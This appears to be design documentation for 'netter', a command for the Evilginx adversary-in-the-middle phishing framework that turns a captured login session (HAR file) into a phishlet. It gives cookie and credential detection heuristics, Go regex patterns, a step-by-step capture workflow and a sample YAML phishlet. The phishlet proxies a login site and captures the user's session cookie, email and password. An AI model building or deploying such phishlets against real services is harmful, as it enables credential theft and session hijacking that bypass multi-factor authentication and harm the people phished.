### Key Features

#### Full Traffic Analysis
- Parses HAR entries to extract all domains/subdomains
- Identifies session cookies with HttpOnly/Secure flags
- Detects POST requests with form or JSON data
- Automatically finds login endpoints that set auth cookies

#### Interactive Selection
```
Found 12 cookies across 3 domains:

Domain: .accounts.example.com
  [1] session_id (HttpOnly, Secure) *likely auth token*
  [2] csrf_token (Secure)

Enter cookie numbers (comma-separated), 'all' for auth candidates, or '*' for all:
```

#### Automatic Detection
- **Credentials**: Matches common username/password field patterns
- **Login URL**: Finds POST request that contains credentials AND sets auth cookies
- **Auth Tokens**: Marks cookies as auth candidates based on HttpOnly + Secure flags

#### Strict Validation
Fails fast with clear error messages:
- "no domains found in HAR file"
- "no POST requests found - capture a login flow"
- "no cookies found in responses"
- "no login endpoint detected"

#### Generated Output
```yaml
# Generated by netter from HAR file
# Date: 2026-01-30
# Domains analyzed: 1
# Cookies captured: 2

min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'example.com', session: true, is_landing: true, auto_filter: true}
auth_tokens:
  - domain: '.accounts.example.com'
    keys: ['session_id']
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'json'
  password:
    key: 'password'
    search: '(.*)'
    type: 'json'
login:
  domain: 'accounts.example.com'
  path: '/api/auth/login'
```

## Usage

### Command Syntax
```bash
evilginx> netter generate /path/to/capture.har
```

### Workflow

1. **Capture HAR File**
   - Open Chrome DevTools (F12) → Network tab
   - Clear existing requests
   - Perform complete login flow
   - Right-click → "Save all as HAR with content"

2. **Run Netter**
   ```
   evilginx> netter generate ~/Downloads/login-session.har
   ```

3. **Interactive Prompts**
   - Select auth cookies to capture
   - Confirm detected credentials
   - Confirm detected login URL

4. **Review & Save**
   - Generated phishlet displayed in terminal
   - Option to save to phishlets directory
   - Manual refinement may be needed

## Limitations (As Designed)

1. **Multi-step Authentication**: Only uses first POST with credentials
2. **Dynamic Cookie Names**: User must manually add `:regexp` modifier
3. **Complex Auth Flows**: OAuth/SAML too complex for automatic generation
4. **Sub-filters**: Always relies on `auto_filter`, doesn't generate custom filters
5. **Header/Body Tokens**: Only generates cookie-based auth tokens automatically

## Architecture Decisions

### HAR Parsing
- Uses standard `encoding/json` for parsing
- Flattens nested JSON POST data with dot notation
- Supports both `application/x-www-form-urlencoded` and `application/json`

### Cookie Detection Heuristics
Auth candidate if:
- `HttpOnly=true AND Secure=true`, OR
- Cookie value length > 32 characters

### Credential Patterns
```go
usernamePatterns := []string{
    `(?i)^(email|user|username|login|account|identifier)$`,
}

passwordPatterns := []string{
    `(?i)^(pass|password|pwd|passphrase)$`,
}
```

### Login Detection
Finds POST request where:
1. Request body contains both username AND password fields
2. Response sets at least one auth candidate cookie

### Directory Discovery
Gets phishlets directory from existing loaded phishlet's path:
```go
phishlet, _ := cfg.GetPhishlet(phishletNames[0])
phishletsDir := filepath.Dir(phishlet.Path)
```
